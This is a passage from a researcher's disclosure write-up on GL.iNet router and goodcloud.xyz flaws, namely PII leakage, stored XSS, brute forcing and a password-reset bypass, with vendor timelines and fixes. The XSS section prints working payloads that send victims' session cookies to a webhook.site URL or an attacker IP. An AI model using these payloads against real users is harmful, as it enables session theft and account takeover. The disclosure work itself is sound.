kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-50.png" class="kg-image" alt="" loading="lazy" width="1244" height="391" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-50.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-50.png 1000w, https://boschko.ca/content/images/2022/05/image-50.png 1244w" sizes="(min-width: 720px) 720px"></figure><p>Performing this <code>get-user</code> request against an existing user will disclosure the following account information:</p><pre><code>- company name
- account creation time
- credential's salt (string+MD5)
- account email
- account user ID
- last login time
- nickname
- password hash (MD5)
- phone number
- password salt (MD5)
- secret key
- security value (boolean)
- status value (boolean)
- account last updated time
- application user id
- username</code></pre><p>The password appears to be MD5 HMAC but the actual formatting/order is unknown, and not something I deem necessary to figure out. That being said, given all the information retrieved from the disclosure I believe the chances of finding the right combination to be fairly high. Below is an example of how it could be retrieved. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-56.png" class="kg-image" alt="" loading="lazy" width="646" height="387" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-56.png 600w, https://boschko.ca/content/images/2022/05/image-56.png 646w"></figure><p>Additionally, I discovered no rate-limiting mechanisms in place for sharing devices. Therefore, it's relatively easy to enumerate a good majority of valid application users using Burp Suite intruder.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/10/image-106.png" class="kg-image" alt="" loading="lazy" width="693" height="657" srcset="https://boschko.ca/content/images/size/w600/2022/10/image-106.png 600w, https://boschko.ca/content/images/2022/10/image-106.png 693w"></figure><p>Another observation I made, which was not confirmed with the vendor (so is purely speculation) I noticed that not every user had a <code>secret</code> value associated with their account. I suspect that perhaps this secret code is actually leveraged for the 2FA QR code creation mechanism. The syntax would resemble something like this:</p><p><a href="https://www.google.com/chart?chs=200x200&chld=M%7C0&cht=qr&chl=otpauth%3A%2F%2Ftotp%2F%3CUSER+HERE%3E%3Fsecret%3D%3CSECRET+HERE%3E&issuer=goodcloud.xyz&ref=boschko.ca"><code>https://www.google.com/chart?chs=200x200&amp;chld=M|0&amp;cht=qr&amp;chl=otpauth://totp/&lt;USER HERE&gt;?secret=&lt;SECRET HERE&gt;&amp;issuer=goodcloud.xyz</code></a> </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-152.png" class="kg-image" alt="" loading="lazy" width="999" height="318" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-152.png 600w, https://boschko.ca/content/images/2022/09/image-152.png 999w" sizes="(min-width: 720px) 720px"></figure><p>This is purely speculative. </p><p>The GL.iNET team was extremely quick to remediate this issue. Less than 12h after reporting it a fix was applied as seen below. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-52.png" class="kg-image" alt="" loading="lazy" width="1260" height="524" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-52.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-52.png 1000w, https://boschko.ca/content/images/2022/05/image-52.png 1260w" sizes="(min-width: 720px) 720px"></figure><h3 id="disclosure-timeline-2">Disclosure Timeline </h3><p>May 11, 2022: Initial discovery<br>
May 11, 2022: Vendor contacted &amp; vulnerability reported<br>
May 11, 2022: Vendor confirms vulnerability<br>
May 12, 2022: Vendor patched the vulnerability</p>
<hr><h2 id="stored-cross-site-scripting">Stored Cross-Site Scripting</h2><p>The MT300N-V2 portable router has the ability to join itself to the remote <a href="https://docs.gl-inet.com/en/3/tutorials/cloud/?ref=boschko.ca">cloud management configuration</a> gateway (goodcloud.xyz) which allows for remote management of linked IoT devices.  There exist multiple user input fields that do not properly sanitize user-supplied input. As a result, the application is vulnerable to stored cross-site scripting attacks. If this attack is leveraged against an enterprise account through the <code>Sub Account</code> invitation it can lead to the account takeover of the joined accounts. </p><h3 id="vulnerability-details-3">Vulnerability Details</h3><pre><code>CVE ID: CVE-2022-42054
Access Vector: Network
Security Risk: Medium
Vulnerability: CWE-79
CVSS Base Score: 8.7
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:H</code></pre><p>We'll find the vulnerable inputs field in the "Group Lists" panel, in which a user can modify and create as many groups as they want. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-66.png" class="kg-image" alt="" loading="lazy" width="1175" height="626" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-66.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-66.png 1000w, https://boschko.ca/content/images/2022/05/image-66.png 1175w" sizes="(min-width: 720px) 720px"></figure><p>The vulnerable fields are <code>Company</code> and <code>Description</code>. The payloads I used as a proof of concept are the following:</p><pre><code>&lt;img src=x onerror=confirm(document.cookie)&gt;

or

&lt;img src=x onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x29;&gt;</code></pre><p>Once the group is saved anytime the user either logs in or switches regions (Asia Pacific, America, Europe), logs in, or switched organication the XSS will trigger as seen below. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-57.png" class="kg-image" alt="" loading="lazy" width="2000" height="958" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-57.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-57.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-57.png 1600w, https://boschko.ca/content/images/size/w2400/2022/05/image-57.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>This occurs because there is a <code>listQuery</code> key that checks for <code>{"pageNum":"","pageSize":"","name":"","company":"","description":""}</code> and our XSS is stored and referenced within <code>company</code> name &amp; <code>description</code> which is how the XSS triggers.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-60.png" class="kg-image" alt="" loading="lazy" width="1176" height="606" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-60.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-60.png 1000w, https://boschko.ca/content/images/2022/05/image-60.png 1176w" sizes="(min-width: 720px) 720px"></figure><p>Can this be used maliciously? Unfortunately not with regular user accounts. With enterprise accounts yes, as we'll see later. Here's why. Realistically the only way to leverage this would be to share a device with a malicious named <code>company</code> and <code>description</code> fields with another user. </p><p>Even with the patch for the PII and User Enumeration vulnerability above, it is still possible to enumerate <code>userID</code>'s which is exactly what we need to send a shared device invitation to users. Below is an example request.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-67.png" class="kg-image" alt="" loading="lazy" width="1506" height="352" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-67.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-67.png 1000w, https://boschko.ca/content/images/2022/05/image-67.png 1506w" sizes="(min-width: 720px) 720px"></figure><p>An attacker with a regular user account would create a group with a <code>company</code> or <code>description</code> name like <code>&lt;script type=“text/javascript”&gt;document.location=“http://x.x.x.x:xxxx/?c=“+document.cookie;&lt;/script&gt;</code>. Then invite a victim to that group. When the victim would login the attacker would able to steal their sessions. Unfortunately with a regular user account, this isn't possible. </p><p>If we share the device from <code>boschko</code>(attacker) to <code>boschko1</code>(victim). Here's how the chain would go. After <code>boschko</code> creates the malicious group and sends an invitation to <code>boschko1</code> he's done. The victim <code>boschko1</code> would login and receive the invite from <code>boschko</code> as seen below.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-59.png" class="kg-image" alt="" loading="lazy" width="2000" height="789" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-59.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-59.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-59.png 1600w, https://boschko.ca/content/images/2022/05/image-59.png 2012w" sizes="(min-width: 720px) 720px"></figure><p>However, when we sign-out and back into <code>boschko1</code> no XSS triggered, why? It's because there is a difference between being a <u>member</u> of a shared group (a group shared by another user with you) and being the <u>owner</u> (you made the group shared and created) as can be seen below. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/10/image-108.png" class="kg-image" alt="" loading="lazy" width="1346" height="761" srcset="https://boschko.ca/content/images/size/w600/2022/10/image-108.png 600w, https://boschko.ca/content/images/size/w1000/2022/10/image-108.png 1000w, https://boschko.ca/content/images/2022/10/image-108.png 1346w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-65.png" class="kg-image" alt="" loading="lazy" width="718" height="332" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-65.png 600w, https://boschko.ca/content/images/2022/05/image-65.png 718w"></figure><p>As seen above, a user of a shared group won't have the malicious fields of the group translated to their "frontend".</p><p><u>HOWEVER!</u> If you have a business/enterprise account or are logged in as a business/enterprise user you can leverage this stored XSS to hijack user sessions! All thanks to features only available to business users :). </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-109.png" class="kg-image" alt="" loading="lazy" width="880" height="479" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-109.png 600w, https://boschko.ca/content/images/2022/05/image-109.png 880w" sizes="(min-width: 720px) 720px"></figure><p>Business features provide the ability to add "Sub Accounts". You can think of this as having the ability to enroll staff/employees into your management console/organization. If a user accepts our <code>subAccount</code> invitation they become a staff/employee inside of our "organization". In doing so, we'll have the ability to steal their fresh session cookies after they login because they'd become owners of the malicious group by association.</p><p>Let's take this one step at a time. The Subscription Account panel looks like this. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-88.png" class="kg-image" alt="" loading="lazy" width="1188" height="560" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-88.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-88.png 1000w, https://boschko.ca/content/images/2022/05/image-88.png 1188w" sizes="(min-width: 720px) 720px"></figure><p>I'm sure you can make out its general functionality. After inviting a user via their email address they will receive the following email.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-103.png" class="kg-image" alt="" loading="lazy" width="1128" height="428" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-103.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-103.png 1000w, https://boschko.ca/content/images/2022/05/image-103.png 1128w" sizes="(min-width: 720px) 720px"></figure><p>I'll try and break this down as clearly as I can. </p><ul><li>User A (attacker) is <code>boschko</code> in red highlights. </li><li>User B (victim) is <code>boschko1</code> in green highlights.</li></ul><ol><li>Step 1: Create a malicious company as <code>boschko</code> with XSS company name and description</li><li>Step 2: Invite <code>boschko1</code> to the malicious company as <code>boschko</code></li><li>Step 3: Get boschko1 cookies and use them to log in as him</li></ol><p>Below is the user info of <code>boschko</code> who owns the company/organization <code>test</code>. He also owns the "Group List" <code>happy company</code> the group which is part of the <code>test</code> organization. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-173.png" class="kg-image" alt="" loading="lazy" width="488" height="247"></figure><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-93.png" class="kg-image" alt="" loading="lazy" width="1303" height="386" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-93.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-93.png 1000w, https://boschko.ca/content/images/2022/05/image-93.png 1303w" sizes="(min-width: 720px) 720px"></figure><p><code>boschko1</code> has been sent an invitation email from <code>boschko</code>, <code>boschko1</code> has accepted and has been enrolled into <code>boschko</code>'s <code>test</code> organization. <code>boschko1</code> has been given the <code>Deployment Operator</code> level access over the organization. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-103.png" class="kg-image" alt="" loading="lazy" width="1128" height="428" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-103.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-103.png 1000w, https://boschko.ca/content/images/2022/05/image-103.png 1128w" sizes="(min-width: 720px) 720px"></figure><p>Logged into <code>boschko1</code> the user would see the following two "workspaces", his personal <code>boschko1 (mine)</code> and the one he has been invited to <code>test</code>.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-99.png" class="kg-image" alt="" loading="lazy" width="689" height="225" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-99.png 600w, https://boschko.ca/content/images/2022/05/image-99.png 689w"></figure><p>When <code>boschko1</code> is signed into his own team/organization <code>boschko1 (mine)</code>, if devices are <u>shared</u> with him nothing bad happens.  </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-102.png" class="kg-image" alt="" loading="lazy" width="686" height="188" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-102.png 600w, https://boschko.ca/content/images/2022/05/image-102.png 686w"></figure><p>When <code>boschko1</code> signes into the <code>test</code> organization that <code>boschko</code> owns by <code>Switch Teams</code> the malicious <code>company</code> and <code>description</code> are properly referenced/called upon when <code>listQuery</code> action.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-101.png" class="kg-image" alt="" loading="lazy" width="686" height="182" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-101.png 600w, https://boschko.ca/content/images/2022/05/image-101.png 686w"></figure><p>The stored XSS in the malicious <code>test</code> company, <code>company</code> and <code>description</code> fields (members of the <code>happy company</code> Group List) gets trigger when <code>boschko1</code> is signed into <code>boschko</code> organization <code>test</code>.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-98.png" class="kg-image" alt="" loading="lazy" width="709" height="318" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-98.png 600w, https://boschko.ca/content/images/2022/05/image-98.png 709w"></figure><p>From our malicious <code>boschko</code> user, we will create a group with the following malicious <code>company</code> and <code>description</code> names.</p><pre><code>&lt;img src=x onerror=this.src='https://webhook.site/6cb27cce-4dfd-4785-8ee8-70e932b1b8ca?c='+document.cookie&gt;
</code></pre><p>We can leverage <a href="https://webhook.site/?ref=boschko.ca">the following website</a> since we're too lazy to spin up a digital ocean droplet. With this webhook in hand, we’re ready to steal the cookies of <code>boschko1</code>.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-90.png" class="kg-image" alt="" loading="lazy" width="1398" height="526" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-90.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-90.png 1000w, https://boschko.ca/content/images/2022/05/image-90.png 1398w" sizes="(min-width: 720px) 720px"></figure><p>Above, <code>boschko</code> has stored the malicious javascript within his <code>company</code> and <code>description</code> fields simply log  <code>boschko1</code> into the <code>test</code> organization owned by <code>boschko</code> and receive the cookies via the webhook.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-91.png" class="kg-image" alt="" loading="lazy" width="830" height="209" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-91.png 600w, https://boschko.ca/content/images/2022/05/image-91.png 830w" sizes="(min-width: 720px) 720px"></figure><p>As seen below, we get a bunch of requests made containing the session cookies of <code>boschko1</code>. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-107.png" class="kg-image" alt="" loading="lazy" width="608" height="882" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-107.png 600w, https://boschko.ca/content/images/2022/05/image-107.png 608w"></figure><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-106.png" class="kg-image" alt="" loading="lazy" width="1791" height="687" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-106.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-106.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-106.png 1600w, https://boschko.ca/content/images/2022/05/image-106.png 1791w" sizes="(min-width: 720px) 720px"></figure><p>Using the stolen <code>boschko1</code> session cookies the account can be hijacked.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-61.png" class="kg-image" alt="" loading="lazy" width="1123" height="414" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-61.png 600w, https://boschko.ca/content/images/size/w1000/2022/09/image-61.png 1000w, https://boschko.ca/content/images/2022/09/image-61.png 1123w" sizes="(min-width: 720px) 720px"></figure><p>The GL.iNET team remediated the issue by July 15 with some pretty solid/standard filtering.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/07/image-9.png" class="kg-image" alt="" loading="lazy" width="1272" height="543" srcset="https://boschko.ca/content/images/size/w600/2022/07/image-9.png 600w, https://boschko.ca/content/images/size/w1000/2022/07/image-9.png 1000w, https://boschko.ca/content/images/2022/07/image-9.png 1272w" sizes="(min-width: 720px) 720px"></figure><p>I attempted a handful of bypasses with U+FF1C and U+FF1E, some more funky keyword filtering,  substrings, array methods, etc, and had no success bypassing the patch. </p><h3 id="disclosure-timeline-3">Disclosure Timeline </h3><p>May 12, 2022: Initial discovery<br>
May 12, 2022: Vendor contacted &amp; vulnerability reported<br>
May 13, 2022: Vendor confirms vulnerability<br>
May 19, 2022: Contact vendor about enterprise user impact<br>
July 7, 2022: Follow up with the vendor<br>
July 15, 2022: Vendor patched the vulnerability</p>
<hr><h2 id="weak-password-requirements-no-rate-limiting">Weak Password Requirements &amp; No Rate Limiting</h2><p>The MT300N-V2 portable router has the ability to join itself to the remote <a href="https://docs.gl-inet.com/en/3/tutorials/cloud/?ref=boschko.ca">cloud management configuration</a> gateway with its accounts created through goodcloud.xyz which allows for remote management of linked IoT devices. The login for goodcloud.xyz was observed to have no rate limiting. Additionally, user passwords only require a minimum of 6 characters and no special characters/password policy. This makes it extremely simple for an attacker to brute force user accounts leading to account takeover. </p><h3 id="vulnerability-details-4">Vulnerability Details</h3><pre><code>CVE ID: N/A
Access Vector: Network
Security Risk: Medium
Vulnerability: CWE-521
CVSS Base Score: 9.3
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N</code></pre><p>As seen below when users create their cloud gateway <code>goodcloud.xyz</code> accounts they're only required to have a password ≥6 with no capitalization, or special characters being required or enforced. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-83.png" class="kg-image" alt="" loading="lazy" width="992" height="202" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-83.png 600w, https://boschko.ca/content/images/2022/05/image-83.png 992w" sizes="(min-width: 720px) 720px"></figure><p>Additionally, due to having no rate limiting on login attempts by using Burp Suite intruder it's trivial to spray users or brute force user accounts.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-84.png" class="kg-image" alt="" loading="lazy" width="1718" height="456" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-84.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-84.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-84.png 1600w, https://boschko.ca/content/images/2022/05/image-84.png 1718w" sizes="(min-width: 720px) 720px"></figure><p>Below is an example of successfully obtaining the password for a sprayed user. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-153.png" class="kg-image" alt="" loading="lazy" width="605" height="483" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-153.png 600w, https://boschko.ca/content/images/2022/09/image-153.png 605w"></figure><p>In total, I was able to recover the passwords of <code>33</code> application users. I never tested these credentials to log into the UI for obvious ethical reasons. All the data was reported back to the GL.iNET team.  </p><h3 id="disclosure-timeline-4">Disclosure Timeline </h3><p>May 18, 2022: Initial discovery<br>
May 24, 2022: Vendor contacted &amp; vulnerability reported<br>
May 24, 2022: Vendor confirms vulnerability<br>
June 7, 2022: Vendor implements rate-limiting, patching the vulnerability</p>
<hr><h2 id="password-policy-bypass">Password Policy Bypass</h2><p>The MT300N-V2 portable router has the ability to join itself to the remote <a href="https://docs.gl-inet.com/en/3/tutorials/cloud/?ref=boschko.ca">cloud management configuration</a> gateway (goodcloud.xyz) which allows for remote management of linked IoT devices.  For these cloud gateway accounts, while password complexity requirements were implemented in the original signup page, these were not added to the password reset page. The current lack of rate limiting this severely impacts the security posture of the affected users.</p><h3 id="vulnerability-details-5">Vulnerability Details</h3><pre><code>CVE ID: N/A
Access Vector: Network
Security Risk: Medium
Vulnerability: CWE-521
CVSS Base Score: 6.7
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N</code></pre><p>The reset password policy isn't consistent with the registration and change password policy. As a result, it's possible to bypass the 6-character password requirements to a single character. In general, the application should validate that the password contains alphanumeric characters and special characters with a minimum length of around eight. Additionally, I feel like it's best practice not to allow users to set the previously used password as the new password.</p><p>As seen below, through the UI the password change has checks on the client side to ensure the password policy is respected. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-177.png" class="kg-image" alt="" loading="lazy" width="2000" height="1068" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-177.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-177.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-177.png 1600w, https://boschko.ca/content/images/2022/05/image-177.png 2288w" sizes="(min-width: 720px) 720px"></figure><p>In Burp Suite we can intercept the request and manually set it to a single character. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-176.png" class="kg-image" alt="" loading="lazy" width="2000" height="517" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-176.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-176.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-176.png 1600w, https://boschko.ca/content/images/size/w2400/2022/05/image-176.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>The request above is submitting successfully, and the new password for the <code>boschko</code> user has been set to <code>1</code>. The request below is the login request, as you can see it was successful. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-175.png" class="kg-image" alt="" loading="lazy" width="2000" height="520" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-175.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-175.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-175.png 1600w, https://boschko.ca/content/images/size/w2400/2022/05/image-175.png 2400w" sizes="(min-width: 720px) 720px"></figure><h3 id="disclosure-timeline-5">Disclosure Timeline </h3><p>May 26, 2022: Initial discovery<br>
May 26, 2022: Vendor contacted &amp; vulnerability reported<br>
May 26, 2022: Vendor confirms vulnerability<br>
July 7, 2022: Follow up with the vendor<br>
July 15, 2022: Vulnerability has been patched</p>
<hr><h3 id="additional-interesting-finds">Additional Interesting Finds </h3><p>I made a few interesting discoveries that I don't consider vulnerabilities. </p><p>Before we jump into this one we have to quickly talk about ACL configuration. Basically, for <code>rpc</code> having appropriate access control over the invocations the application can make is very important. These methods should be strictly controlled. For more information on this refer to the <a href="https://oldwiki.archive.openwrt.org/doc/techref/ubus?ref=boschko.ca">Ubus-Wiki</a>.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-29.png" class="kg-image" alt="" loading="lazy" width="1910" height="644" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-29.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-29.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-29.png 1600w, https://boschko.ca/content/images/2022/05/image-29.png 1910w" sizes="(min-width: 720px) 720px"></figure><p>Once we've installed OpenWrt as seen above, the application will generate the list of <code>rpc</code> invocation methods for OpenWrt which is defined within the ACL configuration file <code>/usr/share/rpcd/acl.d/luci-base.json</code>. Here is a snippet of the file in question.</p><pre><code>...
	"luci-access": {
		"description": "Grant access to basic LuCI procedures",
		"read": {
			"cgi-io": [ "backup", "download", "exec" ],
			"file": {
				"/": [ "list" ],
				"/*": [ "list" ],
				"/dev/mtdblock*": [ "read" ],
				"/etc/crontabs/root": [ "read" ],
				"/etc/dropbear/authorized_keys": ["read"],
				"/etc/filesystems": [ "read" ],
				"/etc/rc.local": [ "read" ],
				"/etc/sysupgrade.conf": [ "read" ],
				"/etc/passwd": [ "read" ],
				"/etc/group": [ "read" ],
				"/proc/filesystems": [ "read" ],
...
		"write": {
			"cgi-io": [ "upload" ],
			"file": {
				"/etc/crontabs/root": [ "write" ],
				"/etc/init.d/firewall restart": ["exec"],
				"/etc/luci-uploads/*": [ "write" ],
				"/etc/rc.local": [ "write" ],
				"/etc/sysupgrade.conf": [ "write" ],
				"/sbin/block": [ "exec" ],
				"/sbin/firstboot": [ "exec" ],
				"/sbin/ifdown": [ "exec" ],
...</code></pre><p>Not being a subject matter expert, I would however say that the above methods are well-defined. Methods in the file namespace aren't simply "allow all" - <code>( "file": [ "*" ] )</code> if it were the case, then this would be an actual vulnerability.</p><p><code>rpcd</code> has also a defined user in <code>/etc/config/rpcd</code> that we can use for the management interface. This user is used to execute code through a large number of  <code>rpcd</code> exposed methods. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-25.png" class="kg-image" alt="" loading="lazy" width="552" height="276"></figure><p>With this information in hand, we should be able to login with these credentials. As a result, we will obtain a large number of methods that can be called, and get the <code>ubus_rpc_session</code>. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-28.png" class="kg-image" alt="" loading="lazy" width="1380" height="716" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-28.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-28.png 1000w, https://boschko.ca/content/images/2022/05/image-28.png 1380w" sizes="(min-width: 720px) 720px"></figure><p>As seen in the following image this <code>ubus_rpc_session</code> value is used to call other methods defined in ACL config files. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-26.png" class="kg-image" alt="" loading="lazy" width="827" height="119" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-26.png 600w, https://boschko.ca/content/images/2022/05/image-26.png 827w" sizes="(min-width: 720px) 720px"></figure><p>Now we might look at the image above and think we have RCE of sorts. However, for some weird reason <code>/etc/passwd</code> is actually defined with valid read primitives within the <code>luci-base.json</code> ACL config file. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-30.png" class="kg-image" alt="" loading="lazy" width="620" height="392" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-30.png 600w, https://boschko.ca/content/images/2022/05/image-30.png 620w"></figure><p>As seen below attempting to read any other files will result in a failed operation. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-31.png" class="kg-image" alt="" loading="lazy" width="2000" height="1057" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-31.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-31.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-31.png 1600w, https://boschko.ca/content/images/2022/05/image-31.png 2168w" sizes="(min-width: 720px) 720px"></figure><p>I simply found this interesting hence why I am writing about it. </p><hr><h2 id="hardware-teardown">Hardware Teardown </h2><p>Let's actually start the intended project! The GL-MT300N router looks like this:</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-60.png" class="kg-image" alt="" loading="lazy" width="1795" height="595" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-60.png 600w, https://boschko.ca/content/images/size/w1000/2022/09/image-60.png 1000w, https://boschko.ca/content/images/size/w1600/2022/09/image-60.png 1600w, https://boschko.ca/content/images/2022/09/image-60.png 1795w" sizes="(min-width: 720px) 720px"></figure><p>It's nothing fancy, the device has a USB port, 2 ethernet ports (LAN &amp; WAN), a reset button, and a mode switch. Let's break it open and see what hardware we have on hand.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-37.png" class="kg-image" alt="" loading="lazy" width="1730" height="869" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-37.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-37.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-37.png 1600w, https://boschko.ca/content/images/2022/05/image-37.png 1730w" sizes="(min-width: 720px) 720px"></figure><p>Immediately there are some interesting components. There looks to be a system on a chip (SoC), SPI flash, and some SD RAM. There is also a serial port and what looks like could potentially be JTAG, and almost definitely UART.</p><p>In terms of chipsets, there is a MediaTek MT7628NN chip which is described as being a "router on a chip" the <a href="https://pdf1.alldatasheet.com/datasheet-pdf/view/1131988/ETC2/MT7628.html?ref=boschko.ca">datasheet</a> shows it is basically the CPU and it supports the requirements for the entry-level AP/router.</p><p>Looking at the diagram of the chip there is communication for UART, SPI, and I2C which are required to transfer data. This also confirms that this chip has a serial console that can be used for debugging. If this is still enabled this could allow us to access the box while it's running and potentially obtain a shell on the system. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-38.png" class="kg-image" alt="" loading="lazy" width="1550" height="652" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-38.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-38.png 1000w, https://boschko.ca/content/images/2022/05/image-38.png 1550w" sizes="(min-width: 720px) 720px"></figure><p>The second chip is the Macronix <a href="https://datasheet.octopart.com/MX25L12835FZ2I-10G-Macronix-datasheet-14372549.pdf?ref=boschko.ca">MX25L12835F</a> SPI (serial flash chip) this is what attacked for most of the reversing process to obtain the application's firmware. This is because the serial flash usually contains the configuration settings, file systems, and is generally the storage for devices lacking peripherals would be stored. And looking around on the board there is no other "storage device". </p><p>The third, and last chip is the Etron Technology <a href="https://www.etron.com./manager/uploads/EM68C16CWQG%20Industrial_Rev%201.2.pdf?ref=boschko.ca">EM68C16CWQG-25H</a> which is the ram used by the device when it is running. </p><h3 